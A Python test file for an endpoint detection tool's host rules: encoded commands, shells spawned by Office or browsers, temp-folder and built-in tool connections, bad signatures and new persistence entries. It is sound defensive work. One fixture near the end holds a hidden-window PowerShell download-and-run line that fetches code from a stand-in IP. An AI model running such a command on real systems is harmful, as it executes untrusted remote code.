"""Endpoint rules (R17-R21): host cases from the agent's own rows, on synthetic osquery/Sysmon rows only."""

import json
from datetime import datetime, timezone

from conftest import T0, conn, dns

from tapwatch import config, detectors, zeek
from tapwatch.hostrules import (
    DUMP_MIN,
    NAMES,
    AppSpawnsShell,
    BadSignatureConnects,
    DestructiveCommand,
    EncodedCommand,
    EndpointState,
    LolbinConnects,
    NewPersistence,
    TempFolderConnects,
    _entry_key,
    build,
    folder_class,
)
from tapwatch.models import Route
from tapwatch.pipeline import Pipeline
from tapwatch.router import CODE_ONLY, critical, route, wants_ai
from tapwatch.store import Store
from tapwatch.summarizer import Assets, summarize

PC = "192.168.50.10"
DST = "203.0.113.50"
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
CMD = r"C:\Windows\System32\cmd.exe"
WORD = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
OUTLOOK = r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"
CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
EXPLORER = r"C:\Windows\explorer.exe"
TEMP_EXE = r"C:\Users\<user>\AppData\Local\Temp\7zS1\setup.exe"
PUBLIC_EXE = r"C:\Users\Public\svc.exe"
DOWNLOADS_EXE = r"C:\Users\<user>\Downloads\tool.exe"


def utc(t):
    return datetime.fromtimestamp(t, timezone.utc).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]


def sysmon(eid, t, guid="{g1}", **cols):
    """One Sysmon row as the agent's `sysmon_events` query logs it, read 40 s later (the query interval)."""
    return {"_type": "osquery", "name": "sysmon_events", "unixTime": int(t) + 40, "ts": int(t) + 40,
            "action": "added", "columns": {"eventid": str(eid), "utc": utc(t), "guid": guid, **cols}}


def start(t, path, parent, guid="{g1}", **flags):
    return sysmon(1, t, guid, path=path, parent_path=parent, **flags)


def connect(t, path, guid="{g1}", remote=DST, port=443):
    return sysmon(3, t, guid, path=path, remote_address=remote, remote_port=str(port))


def snapshot_conn(t, name, path, signature, signer="", remote=DST, port=443, action="added"):
    return {"_type": "osquery", "name": "outbound_connections", "unixTime": int(t), "ts": int(t), "action": action,
            "columns": {"name": name, "path": path, "pid": "4242", "remote_address": remote, "remote_port": str(port),
                        "signature": signature, "signer": signer, "parent_name": "explorer.exe"}}


def sigs(t, *rows):
    """A process_signatures snapshot: (path, signature, signer) per program that holds a socket."""
    return {"_type": "osquery", "name": "process_signatures", "action": "snapshot", "unixTime": int(t), "ts": int(t),
            "snapshot": [{"path": p, "signature": sig, "signer": signer} for p, sig, signer in rows]}


def addrs(t, *ips):
    return {"_type": "osquery", "name": "host_addresses", "action": "snapshot", "unixTime": int(t), "ts": int(t),
            "snapshot": [{"address": a} for a in ips]}


def run(det, *recs):
    out = []
    for r in recs:
        out += det.feed(r)
    return out


def st():
    return EndpointState(PC)


def no_paths(case):
    """A case carries program names (as indicators) and folder classes, never a path or a command line."""
    text = json.dumps(case.facts) + json.dumps(case.indicators)
    assert "C:\\\\" not in text and "<user>" not in text and "cmdline" not in text, text
    assert "/" not in case.facts.get("entry", "")   # an entry name is never a file path
    assert case.indicators and case.host == PC and case.facts["source"] == "endpoint"


# ------------------------------------------------------------ R17 encoded or download-and-run command

def test_encoded_download_from_a_document_app_is_must_alert():
    (c,) = run(EncodedCommand(st()), start(T0, PS, WORD, cmd_enc="1", cmd_dl="1", cmd_url="1"))
    assert c.must_alert and c.base_severity == 5 and c.detector == "host_encoded_cmd"
    assert c.facts["signals"] == ["an encoded payload", "a download-and-run"] and c.facts["parent_class"] == "document"
    assert c.facts["program"] == "powershell.exe" and c.facts["folder"] == "installed" and c.ts == T0
    assert c.indicators == ["powershell.exe"] and c.indicator == "powershell.exe"
    no_paths(c)


def test_one_strong_signal_alerts_and_hidden_window_makes_it_must_alert():
    (enc,) = run(EncodedCommand(st()), start(T0, PS, EXPLORER, cmd_enc="1"))
    assert (enc.base_severity, enc.must_alert) == (4, False)
    (hidden,) = run(EncodedCommand(st()), start(T0, PS, EXPLORER, cmd_dl="1", cmd_hidden="1"))
    assert (hidden.base_severity, hidden.must_alert) == (5, True) and hidden.facts["unusual"] == ["a hidden window"]
    (enc2,) = run(EncodedCommand(st()), start(T0, PS, EXPLORER, cmd_enc="1", cmd_b64="1"))
    assert enc2.must_alert


def test_chocolateys_install_line_alerts_but_is_suppressible():
    """dl + iex + an execution-policy bypass is Chocolatey's documented install command: a benign reading
    exists, and must_alert can't be suppressed, so it stays at severity 4 (review of PR #87)."""
    (choco,) = run(EncodedCommand(st()), start(T0, PS, EXPLORER, cmd_dl="1", cmd_iex="1", cmd_bypass="1", cmd_url="1"))
    assert (choco.base_severity, choco.must_alert) == (4, False) and choco.facts["unusual"] == ["an execution-policy bypass"]


def test_a_weak_signal_alone_raises_nothing_unless_a_browser_started_it():
    """`iex (irm ...)` installs dev tools; base64 decoding is in ordinary scripts. From a browser it isn't."""
    assert run(EncodedCommand(st()), start(T0, PS, EXPLORER, cmd_iex="1"), start(T0, CMD, EXPLORER, cmd_b64="1")) == []
    (c,) = run(EncodedCommand(st()), start(T0, PS, CHROME, cmd_iex="1"))
    assert (c.base_severity, c.must_alert, c.facts["parent_class"]) == (4, False, "browser")
    (both,) = run(EncodedCommand(st()), start(T0, PS, EXPLORER, cmd_iex="1", cmd_b64="1"))
    assert (both.base_severity, both.must_alert) == (4, False)                              # two weak ones together: an alert


def test_signals_on_programs_that_are_not_shells_are_ignored():
    """Measured: the only encoded-payload signal in 34.5 h was msiexec passing a long argument to itself."""
    msi = r"C:\Windows\System32\msiexec.exe"
    assert run(EncodedCommand(st()), start(T0, msi, msi, cmd_enc="1")) == []
    assert run(EncodedCommand(st()), start(T0, PS, EXPLORER, cmd_url="1")) == []           # a URL alone is no signal
    assert run(EncodedCommand(st()), start(T0, PS, EXPLORER, cmd_hidden="1", cmd_bypass="1")) == []  # installers do this


# ------------------------------------------------------------ R18 document app or browser starts a shell

def test_document_app_starting_powershell_alerts():
    (c,) = run(AppSpawnsShell(st()), start(T0, PS, WORD))
    assert c.base_severity == 4 and not c.must_alert and c.facts["parent_class"] == "document"
    assert "document" in c.title and c.facts["parent"] == "WINWORD.EXE"
    assert c.indicators == ["WINWORD.EXE > powershell.exe"]                                # what a suppression keys on
    no_paths(c)


def test_browser_starting_cmd_alone_raises_nothing():
    """Measured: Chrome started cmd.exe 37 times in 34.5 h (native-messaging hosts), none with a URL, none connected."""
    d = AppSpawnsShell(st())
    assert run(d, start(T0, CMD, CHROME), start(T0 + 60, CMD, CHROME, guid="{g2}", cmd_url="1"),
               start(T0 + 60, PS, CHROME, guid="{g3}", cmd_dl="1")) == []
    assert run(EncodedCommand(st()), start(T0, PS, CHROME, cmd_dl="1"))[0].base_severity == 4   # R17 has that one


def test_browser_child_that_connects_to_the_internet_alerts_once():
    d = AppSpawnsShell(st())
    assert run(d, start(T0, CMD, CHROME)) == []
    assert run(d, connect(T0 + 2, CMD, remote="192.168.50.1")) == []                       # the LAN doesn't count
    (c,) = run(d, connect(T0 + 5, CMD))
    assert c.base_severity == 4 and c.facts["connected"] and c.facts["port"] == 443 and "connected" in c.title
    assert c.indicators == ["chrome.exe > cmd.exe"]
    assert run(d, connect(T0 + 6, CMD, port=8443)) == []                                   # one case per process
    no_paths(c)
    late = AppSpawnsShell(st())
    run(late, start(T0, CMD, CHROME))
    assert run(late, connect(T0 + 700, CMD)) == []                                         # outside the 10-minute join


def test_document_child_is_not_reported_twice_and_other_parents_are_ignored():
    d = AppSpawnsShell(st())
    assert len(run(d, start(T0, PS, WORD), connect(T0 + 1, PS))) == 1
    wsl = r"C:\Windows\System32\wslhost.exe"
    assert run(AppSpawnsShell(st()), start(T0, CMD, wsl), start(T0, PS, EXPLORER, guid="{g2}"),
               start(T0, PS, CMD, guid="{g3}")) == []


# ------------------------------------------------------------ R19 program in a temp folder connects out

def test_temp_and_downloads_programs_connecting_out_are_digest_items():
    (c,) = run(TempFolderConnects(st()), connect(T0, TEMP_EXE))
    assert c.base_severity == 3 and c.facts == {"source": "endpoint", "program": "setup.exe", "folder": "temp", "port": 443}
    assert c.indicators == ["setup.exe"]
    no_paths(c)
    (dl,) = run(TempFolderConnects(st()), connect(T0, DOWNLOADS_EXE))
    assert dl.base_severity == 3 and dl.facts["folder"] == "downloads"
    d = TempFolderConnects(st())
    run(d, connect(T0, TEMP_EXE))
    assert run(d, connect(T0 + 60, TEMP_EXE, guid="{g2}", port=80)) == []                  # the installer keeps going


def test_shared_folders_and_dropper_shapes_alert():
    (pub,) = run(TempFolderConnects(st()), connect(T0, PUBLIC_EXE))
    assert pub.base_severity == 4 and pub.facts["folder"] == "shared"
    (dropped,) = run(TempFolderConnects(st()), start(T0, TEMP_EXE, OUTLOOK), connect(T0 + 3, TEMP_EXE))
    assert dropped.base_severity == 4 and dropped.facts["parent"] == "OUTLOOK.EXE" and dropped.facts["parent_class"] == "document"
    (scripted,) = run(TempFolderConnects(st()), start(T0, TEMP_EXE, EXPLORER, cmd_dl="1"), connect(T0 + 3, TEMP_EXE))
    assert scripted.base_severity == 4 and scripted.facts["signals"] == ["a download-and-run"]


def test_installed_programs_lan_and_dns_do_not_count():
    d = TempFolderConnects(st())
    assert run(d, connect(T0, CHROME), connect(T0, TEMP_EXE, remote="192.168.50.1"),
               connect(T0, TEMP_EXE, remote="203.0.113.1", port=53), connect(T0, TEMP_EXE, remote="not an ip")) == []


# ------------------------------------------------------------ R20 built-in tool connects out

def test_download_lolbins_are_must_alert_and_the_rest_alert():
    certutil = r"C:\Windows\System32\certutil.exe"
    (c,) = run(LolbinConnects(st()), connect(T0, certutil))
    assert c.must_alert and c.base_severity == 5 and c.facts["downloader"] and c.facts["program"] == "certutil.exe"
    no_paths(c)
    rundll = r"C:\Windows\System32\rundll32.exe"
    (r,) = run(LolbinConnects(st()), start(T0, rundll, WORD, cmd_url="1"), connect(T0 + 1, rundll))
    assert (r.base_severity, r.must_alert) == (4, False)
    assert r.facts["parent"] == "WINWORD.EXE" and r.facts["url"] and r.facts["parent_class"] == "document"


def test_msbuild_is_a_weekly_digest_item_not_an_hourly_alert():
    """MSBuild restores NuGet packages on any Visual Studio PC (review of PR #87)."""
    d = LolbinConnects(st())
    msbuild = r"C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"
    (c,) = run(d, connect(T0, msbuild))
    assert (c.base_severity, c.must_alert, c.facts["downloader"]) == (3, False, False)
    assert run(d, connect(T0 + 3600, msbuild, guid="{g2}")) == []
    assert len(run(d, connect(T0 + 8 * 86400, msbuild, guid="{g3}"))) == 1


def test_lolbins_on_the_lan_and_ordinary_programs_are_ignored():
    rundll = r"C:\Windows\System32\rundll32.exe"
    assert run(LolbinConnects(st()), connect(T0, rundll, remote="192.168.50.2"), connect(T0, rundll, port=53),
               connect(T0, CHROME), connect(T0, PS)) == []


# ------------------------------------------------------------ R21 bad code signature connects out

def test_untrusted_and_distrusted_signatures_alert_missing_is_ignored():
    """osquery's authenticode says trusted, missing, untrusted or distrusted; a tampered file is `untrusted`."""
    app = r"C:\Program Files\App\app.exe"
    (bad,) = run(BadSignatureConnects(st()), snapshot_conn(T0, "app.exe", app, "untrusted", "App Maker"))
    assert (bad.base_severity, bad.must_alert) == (4, False) and bad.facts["signature"] == "untrusted"
    assert bad.facts["signer"] == "App Maker" and bad.facts["folder"] == "installed" and bad.facts["parent"] == "explorer.exe"
    no_paths(bad)
    (blocked,) = run(BadSignatureConnects(st()), snapshot_conn(T0, "x.exe", app, "Distrusted"))
    assert blocked.base_severity == 4
    # measured: every "missing" or unreadable signature in 34.5 h was an installed app osquery couldn't read
    assert run(BadSignatureConnects(st()), snapshot_conn(T0, "a.exe", app, "missing"), snapshot_conn(T0, "b.exe", app, ""),
               snapshot_conn(T0, "c.exe", app, "trusted"), snapshot_conn(T0, "d.exe", app, "untrusted", action="removed"),
               snapshot_conn(T0, "e.exe", app, "untrusted", remote="192.168.50.9")) == []


def test_signature_and_connection_join_by_path_whichever_comes_first():
    """2026-10-17: the signature moved out of the socket query (15 s per socket, watchdog-killed, denylisted 24 h)
    into a 5-minute per-path snapshot, so either row can arrive first."""
    app = r"C:\Users\<user>\AppData\Local\Temp\tapwatch-sig-test.exe"
    # signature known, then the connection: fires on the connection row
    (a,) = run(BadSignatureConnects(st()), sigs(T0, (app, "untrusted", "")),
               snapshot_conn(T0 + 30, "tapwatch-sig-test.exe", app, ""))
    assert a.base_severity == 4 and a.facts["signature"] == "untrusted" and a.facts["folder"] == "temp"
    assert a.facts["port"] == 443 and a.facts["parent"] == "explorer.exe"
    # connection first, then the signature within the window: fires on the signature row, with the socket's facts
    (b,) = run(BadSignatureConnects(st()), snapshot_conn(T0, "tapwatch-sig-test.exe", app, ""),
               sigs(T0 + 240, (app, "Untrusted", "Self")))
    assert b.facts["signer"] == "Self" and b.facts["port"] == 443 and b.indicators == ["tapwatch-sig-test.exe"]
    # the window is 600 s inclusive; a signature for a program that last connected before that, or never, or to the
    # LAN, or whose connection row was a `removed` one: nothing
    assert len(run(BadSignatureConnects(st()), snapshot_conn(T0, "x.exe", app, ""), sigs(T0 + 600, (app, "untrusted", "")))) == 1
    assert run(BadSignatureConnects(st()), snapshot_conn(T0, "x.exe", app, ""), sigs(T0 + 601, (app, "untrusted", ""))) == []
    assert run(BadSignatureConnects(st()), snapshot_conn(T0, "x.exe", app, "", action="removed"),
               sigs(T0 + 60, (app, "untrusted", ""))) == []
    assert run(BadSignatureConnects(st()), sigs(T0, (app, "untrusted", ""))) == []
    assert run(BadSignatureConnects(st()), snapshot_conn(T0, "x.exe", app, "", remote="192.168.50.9"),
               sigs(T0 + 60, (app, "untrusted", ""))) == []
    # trusted or unreadable signatures, either order, and a connection with no signature known at all: nothing
    assert run(BadSignatureConnects(st()), sigs(T0, (app, "trusted", "App Maker"), (r"C:\x\y.exe", "missing", "")),
               snapshot_conn(T0 + 30, "a.exe", app, ""), snapshot_conn(T0 + 30, "y.exe", r"C:\x\y.exe", ""),
               snapshot_conn(T0 + 30, "z.exe", r"C:\x\z.exe", "")) == []
    # the path join is case-insensitive (Windows), and the maps stay bounded
    (cased,) = run(BadSignatureConnects(st()), sigs(T0, (app.upper(), "untrusted", "")), snapshot_conn(T0 + 1, "t.exe", app, ""))
    assert cased.facts["signature"] == "untrusted"
    s = st()
    s.update_signatures([{"path": f"C:\\p\\{i}.exe", "signature": "trusted"} for i in range(700)])
    assert len(s.signatures) == 500 and s.signature_of(r"C:\p\699.exe") == ("trusted", "")
    for i in range(700):
        s.remember_connection({"path": f"C:\\q\\{i}.exe", "remote_address": DST, "remote_port": "443"}, T0 + i)
    assert len(s.connected) <= 601 and s.connection_of(r"C:\q\699.exe", T0 + 699) is not None


# ------------------------------------------------------------ the framework

def test_pc_address_follows_the_agents_snapshots_and_prefers_the_lan():
    s = EndpointState("")
    d = EncodedCommand(s)
    assert s.host == "this PC"                                                              # never an empty host
    d.feed(addrs(T0, "172.28.0.1", "192.168.50.77", "fe80::1", "100.64.0.5"))
    assert s.host == "192.168.50.77"
    d.feed(addrs(T0 + 300, "172.28.0.1", "10.0.0.5"))
    assert s.host == "10.0.0.5"
    configured = EndpointState(PC)
    EncodedCommand(configured).feed(addrs(T0, "192.168.50.77", PC))
    assert configured.host == PC                                                            # the configured one wins
    (c,) = run(EncodedCommand(s), start(T0, PS, WORD, cmd_enc="1", cmd_dl="1"))
    assert c.host == "10.0.0.5"
    # the router's network decides between two LAN-looking addresses: WSL in mirrored mode also lists
    # 10.255.255.254, which sorted ahead of the real address (measured 2026-10-17, #792-#794)
    routed = EndpointState("", gateways=["192.168.50.1"])
    EncodedCommand(routed).feed(addrs(T0, "10.255.255.254", "192.168.50.77", "172.17.0.1"))
    assert routed.host == "192.168.50.77"
    EncodedCommand(routed).feed(addrs(T0 + 300, "10.255.255.254", "172.17.0.1"))
    assert routed.host == "192.168.50.77"                                                   # a routed address, once seen, sticks
    fallback = EndpointState("", gateways=["192.168.50.1"])
    EncodedCommand(fallback).feed(addrs(T0, "10.0.0.5", "172.17.0.1"))
    assert fallback.host == "10.0.0.5"                                                      # never on the router's net: the old order


def test_wsl_nat_snapshot_never_moves_the_host_off_the_lan():
    """Two agents report for one PC: WSL in NAT mode lists only its 172.x address. Taking it at face value gave
    about half the cases the wrong host (review of PR #87), splitting dedupe keys and suppressions."""
    s = EndpointState("")
    d = EncodedCommand(s)
    d.feed(addrs(T0, "192.168.50.77", "172.28.0.1"))                                       # Windows agent
    d.feed(addrs(T0 + 10, "172.28.5.2"))                                                    # WSL agent, NAT mode
    assert s.host == "192.168.50.77"
    fresh = EndpointState("")
    EncodedCommand(fresh).feed(addrs(T0, "172.28.5.2"))
    assert fresh.host == "172.28.5.2"                                                       # better than "this PC"...
    EncodedCommand(fresh).feed(addrs(T0 + 10, "192.168.50.77", "172.28.0.1"))
    assert fresh.host == "192.168.50.77"                                                    # ...until the LAN address shows
    (c,) = run(EncodedCommand(EndpointState("")), start(T0, PS, WORD, cmd_enc="1", cmd_dl="1"))
    assert c.host == "this PC" and c.must_alert                                             # no address yet: still raised


def test_names_are_code_only_and_build_wires_them():
    assert set(NAMES) <= CODE_ONLY
    dets = build({"host_context": {"host": PC}})
    assert [d.name for d in dets] == list(NAMES) and len({id(d.state) for d in dets}) == 1
    assert dets[0].state.host == PC
    for d in dets:
        assert d.feed(conn(T0)) == [] and d.feed(dns(T0, "a.example")) == []               # Zeek records: not ours
    assert build({"detectors": {"host_rules": {"enabled": False}}}) == []
    tuned = build({"detectors": {"host_app_shell": {"reported_days": 1}}})
    assert next(d for d in tuned if d.name == "host_app_shell").ttl == 86400.0


def test_network_detectors_ignore_endpoint_records():
    for d in detectors.build({}):
        assert d.feed(start(T0, PS, WORD, cmd_enc="1")) == [] and d.feed(addrs(T0, PC)) == []


def test_reported_state_persists_and_restores():
    d = TempFolderConnects(st())
    assert len(run(d, connect(T0, TEMP_EXE))) == 1
    fresh = TempFolderConnects(st())
    fresh.restore(d.snapshot())
    assert run(fresh, connect(T0 + 60, TEMP_EXE, guid="{g2}")) == []                        # still this week's item


def test_folder_classes_never_echo_the_path():
    assert folder_class(TEMP_EXE) == "temp" and folder_class(PUBLIC_EXE) == "shared"
    assert folder_class(r"C:\Users\<user>\AppData\Local\Programs\App\App.exe") == "appdata"
    assert folder_class(r"D:\Games\game.exe") == "other" and folder_class("") == "unknown"
    assert folder_class(r"C:\Windows\System32\cmd.exe") == "installed"


# ------------------------------------------------------------ routing and summaries

def test_routing_code_only_floors_and_learning_period():
    (lol,) = run(LolbinConnects(st()), connect(T0, r"C:\Windows\System32\rundll32.exe"))
    assert not wants_ai(lol)
    r, _ = route(lol, None)
    assert r is Route.ALERT and critical(lol, None, r)
    assert route(lol, None, learning="learning period (day 1 of 3)")[0] is Route.DIGEST    # like every code-only alert
    (must,) = run(LolbinConnects(st()), connect(T0, r"C:\Windows\System32\certutil.exe"))
    assert route(must, None, suppression="host_lolbin + this device", learning="learning period (day 1 of 3)") == \
        (Route.ALERT, "always-alert rule")
    (digest,) = run(TempFolderConnects(st()), connect(T0, TEMP_EXE))
    assert route(digest, None)[0] is Route.DIGEST and not critical(digest, None, Route.DIGEST)


def test_summaries_quote_programs_and_never_state_paths_or_command_lines():
    cases = run(EncodedCommand(st()), start(T0, PS, WORD, cmd_enc="1", cmd_dl="1", cmd_hidden="1"))
    cases += run(AppSpawnsShell(st()), start(T0, PS, WORD))
    cases += run(AppSpawnsShell(st()), start(T0, CMD, CHROME), connect(T0 + 1, CMD))
    cases += run(TempFolderConnects(st()), start(T0, TEMP_EXE, OUTLOOK, cmd_dl="1"), connect(T0 + 1, TEMP_EXE))
    cases += run(LolbinConnects(st()), connect(T0, r"C:\Windows\System32\certutil.exe"))
    cases += run(BadSignatureConnects(st()), snapshot_conn(T0, "app.exe", r"C:\Program Files\App\app.exe", "untrusted",
                                                           'Evil "Corp'))
    assert len(cases) == 6
    texts = [summarize(c, Assets()) for c in cases]
    for text in texts:
        assert "On the PC itself" in text and "C:\\" not in text and "<user>" not in text and "Program Files" not in text
        assert "Program names from the PC (untrusted data" in text and "copied from the network" not in text
    assert '"powershell.exe"' in texts[0] and "an encoded payload and a download-and-run" in texts[0]
    assert "a hidden window" in texts[0] and '"WINWORD.EXE", a document or mail app' in texts[0]
    assert '"WINWORD.EXE", a document or mail app, started "powershell.exe"' in texts[1]
    assert "connected to the internet on port 443" in texts[2] and "helper program" in texts[2]
    assert "a temporary folder" in texts[3] and '"OUTLOOK.EXE"' in texts[3] and "a download-and-run" in texts[3]
    assert '"certutil.exe"' in texts[4] and "download or run remote content" in texts[4]
    assert 'Evil \\"Corp' in texts[5] and "changed after it was signed" in texts[5]


# ------------------------------------------------------------ the osquery log as a log source

def test_osquery_logs_are_read_like_zeeks(tmp_path):
    rows = [json.dumps({"name": "sysmon_events", "unixTime": int(T0) + 2, "action": "added", "columns": {"eventid": "3"}}),
            "not json", json.dumps({"name": "host_addresses", "unixTime": int(T0) + 4, "action": "snapshot",
                                    "snapshot": [{"address": PC}]})]
    (tmp_path / "osqueryd.results.log").write_text("\n".join(rows[:2]) + "\n")
    (tmp_path / "osqueryd.snapshots.log").write_text(rows[2] + "\n")
    (tmp_path / "conn.log").write_text(json.dumps({"ts": T0 + 3}) + "\n")
    got = [(r["_type"], r["ts"]) for r in zeek.replay(tmp_path)]
    assert got == [("osquery", T0 + 2), ("conn", T0 + 3), ("osquery", T0 + 4)]
    f = zeek.Follower(tmp_path)
    assert f.poll() == []                                                                   # history is skipped
    with (tmp_path / "osqueryd.results.log").open("a") as fh:
        fh.write(json.dumps({"name": "sysmon_events", "unixTime": int(T0) + 9, "action": "added", "columns": {}}) + "\n")
    (rec,) = f.poll()
    assert rec["_type"] == "osquery" and rec["ts"] == T0 + 9 and rec["name"] == "sysmon_events"
    f.close()


def test_host_log_dirs_are_only_those_with_an_agents_log(tmp_path):
    present = tmp_path / "osquery" / "log" / "osqueryd.results.log"
    present.parent.mkdir(parents=True)
    present.write_text("")
    cfg = {"host_context": {"results_logs": [str(present), str(tmp_path / "missing" / "osqueryd.results.log")]}}
    assert config.host_log_dirs(cfg) == [str(present.parent)]
    assert config.host_log_dirs({"host_context": {"results_logs": [str(tmp_path / "nope.log")]}}) == []


def test_pipeline_routes_host_cases_by_code_without_jev_or_host_context(tmp_path):
    from conftest import FakeJev, write_logs

    from tapwatch.hostctx import HostContext

    class Note:
        def __init__(self):
            self.sent = []

        def send(self, title, items):
            self.sent.append((title, items))
            return ["fake"]

    jev, note = FakeJev(), Note()
    zeek_dir = write_logs(tmp_path, conn=[conn(T0, src=PC)])
    hc = HostContext(PC, None, [], str(tmp_path / "t"))                                     # would apply: it's this PC
    p = Pipeline(build({"host_context": {"host": PC}}), Assets(), Store(":memory:"), client=jev, notifier=note,
                 hostctx=hc, zeek_dirs=[str(zeek_dir)])
    (cid, c, verdict, r), = p.process(connect(T0, r"C:\Windows\System32\certutil.exe"))
    assert r is Route.ALERT and verdict is None and jev.states == []                        # code decided; no tokens
    assert "host_who" not in c.facts                                                        # host context stays out
    assert note.sent and "certutil.exe" in json.dumps(note.sent) and "C:\\\\" not in json.dumps(note.sent)
    row = p.store.get(cid)
    assert row["reason"] == "always-alert rule" and "On the PC itself" in row["state"]
    assert p.process(connect(T0 + 60, r"C:\Windows\System32\certutil.exe", guid="{g2}")) == []   # counted, not re-sent
    assert p.store.get(cid)["hits"] == 2


# ------------------------------------------------------------ R23 new persistence entry

def persist(t, query, change="added", **cols):
    """One differential row of a persistence query, logged when the hourly query ran at `t`."""
    return {"_type": "osquery", "name": query, "unixTime": int(t), "ts": int(t), "action": change, "columns": cols}


def task(t, name, action, change="added"):
    return persist(t, "scheduled_tasks", change, name=name, action=action, path="\\" + name, enabled="1",
                   last_run_time=str(int(t)))


def tick(t):
    return {"_type": "tick", "ts": t}


def settle(det, *recs, at=None):
    """Feed the rows, then a tick two minutes later so the batch is read."""
    last = max(float(r.get("ts") or 0) for r in recs)
    return run(det, *recs, tick((at or last) + 130))


def test_new_task_running_a_script_from_downloads_alerts_and_carries_no_path():
    (c,) = settle(NewPersistence(st()), task(T0, "Updater", r'powershell.exe -File C:\Users\<user>\Downloads\up.ps1'))
    assert c.base_severity == 4 and c.detector == "host_persist" and c.indicators == ["powershell.exe"]
    assert c.facts["kind"] == "scheduled task" and c.facts["entry"] == "Updater" and c.facts["folder"] == "downloads"
    assert c.facts["script"] and c.facts["shell"] and c.facts["signals"] == []
    no_paths(c)
    (enc,) = settle(NewPersistence(st()), task(T0, "Sync", "powershell.exe -enc " + "Q" * 40))
    assert enc.base_severity == 4 and enc.facts["signals"] == ["an encoded or download-and-run command"]


def test_scripts_shells_and_user_folders_are_digest_items_once_a_week():
    # the measured day's shapes: the owner's .vbs in the Startup folder, OneDrive's RunOnce that runs cmd.exe
    det = NewPersistence(st())
    vbs = persist(T0, "startup_items", name="keep-wsl.vbs", path=r"C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\keep-wsl.vbs",
                  args="", source=r"C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup", status="enabled", username="u")
    once = persist(T0, "startup_items", name="Delete Cached Update Binary", path=r"C:\WINDOWS\system32\cmd.exe",
                   args="/q /c del /q cache.exe", source=r"HKEY_USERS\S-1-5-21-1-2-3-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
                   status="enabled", username="u")
    a, b = settle(det, vbs, once)
    assert (a.base_severity, a.facts["kind"], a.facts["script"], a.facts["registry"]) == (3, "startup item", True, False)
    assert (b.base_severity, b.facts["shell"], b.facts["registry"], b.indicators) == (3, True, True, ["cmd.exe"])
    for c in (a, b):
        no_paths(c)
    # the same entry re-created by the next update (a new GUID, a new version in the name) is the same digest line
    again = dict(once, unixTime=int(T0) + 7200, ts=int(T0) + 7200)
    again["columns"] = dict(once["columns"], name="Delete Cached Update Binary 26.183.0920.0005")
    assert settle(det, again) == []
    assert _entry_key("msedge_cleanup_{C50565E9-CCCF-44B4-BA15-5AC5C6569197}") == "msedge_cleanup"
    assert _entry_key("cbdhsvc_e46a2") == "cbdhsvc" and _entry_key("OneDrive Startup Task-S-1-5-21-867515037-1001") == "onedrive startup task"


def test_installed_programs_changes_inventories_and_warmup_raise_nothing():
    det = NewPersistence(st())
    # Windows' own: usoclient under %systemroot%, a per-user svchost service, a task with no action
    quiet = [task(T0, "Schedule Work", r" %systemroot%\system32\usoclient.exe StartWork"),
             persist(T0, "auto_start_services", name="cbdhsvc_7a142", display_name="Clipboard User Service",
                     path=r"C:\WINDOWS\system32\svchost.exe -k ClipboardSvcGroup -p", module_path="", user_account="LocalSystem"),
             task(T0, "SoftLandingDeferralTask-{e35fd6a0-ee4d-41d0-ac6e-69f3f6b9d159}", "")]
    assert settle(det, *quiet) == []
    # a task that ran: removed + added in one run because last_run_time changed, even for a script
    ran = [task(T0 + 3600, "Backup", r"wscript.exe C:\Users\<user>\backup.vbs", "removed"),
           task(T0 + 3600, "Backup", r"wscript.exe C:\Users\<user>\backup.vbs")]
    assert settle(det, *ran) == []
    # ... but the same script task appearing without a removed partner is new
    assert len(settle(det, task(T0 + 7200, "Backup2", r"wscript.exe C:\Users\<user>\backup2.vbs"))) == 1
    # an inventory: the first run after the agent's database was reset lists everything as added
    dump = [task(T0 + 10800, f"T{i}", rf"wscript.exe C:\Users\<user>\t{i}.vbs") for i in range(DUMP_MIN)]
    assert settle(det, *dump) == []
    # during warm-up everything is learned, and it stays learned after a restart
    from tapwatch.detectors import Warmup, decode, encode
    w = Warmup(600)
    learning = NewPersistence(st(), warmup=w)
    assert settle(learning, task(T0, "Learned", r"wscript.exe C:\Users\<user>\x.vbs")) == []
    saved = {k: decode(v) for k, v in json.loads(json.dumps(learning.snapshot())).items()}
    restarted = NewPersistence(st(), warmup=Warmup(0))
    restarted.restore(learning.snapshot())
    assert settle(restarted, task(T0 + 1000, "Learned", r"wscript.exe C:\Users\<user>\x.vbs")) == []   # known
    assert len(settle(restarted, task(T0 + 1000, "Fresh", r"wscript.exe C:\Users\<user>\y.vbs"))) == 1
    assert "known" in saved and encode(restarted.known)


def test_cron_and_launch_agents_use_posix_folders():
    cron = persist(T0, "crontab", event="", minute="*/5", hour="*", day_of_month="*", month="*", day_of_week="*",
                   command="/usr/bin/python3 /home/u/sync.py", path="/var/spool/cron/crontabs/u")
    (c,) = settle(NewPersistence(st()), cron)
    assert c.facts["kind"] == "cron job" and c.facts["script"] and c.facts["folder"] == "profile" and c.base_severity == 3
    assert c.facts["entry"] == "a user's crontab" and "/u" not in json.dumps(c.facts)   # the file path names the user
    sys_cron = persist(T0, "crontab", event="", minute="0", hour="3", day_of_month="*", month="*", day_of_week="*",
                       command="/opt/backup/run.sh", path="/etc/cron.d/backup")
    assert settle(NewPersistence(st()), sys_cron)[0].facts["entry"] == "backup"


def test_run_key_payloads_without_a_drive_letter_still_alert():
    # review of #137: a Run key's value is often a bare `powershell -nop -w hidden -c iex (...)` or `mshta http://...`
    det = NewPersistence(st())
    rows = [persist(T0, "startup_items", name="Updater", path="powershell -nop -w hidden -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')",
                    args="", source=r"HKEY_USERS\\S-1-5-21-1-2-3-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", status="enabled", username="u"),
            persist(T0, "startup_items", name="Helper", path=r"cmd /c start C:\\Users\\<user>\\Downloads\\x.exe", args="",
                    source=r"HKEY_USERS\\S-1-5-21-1-2-3-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", status="enabled", username="u"),
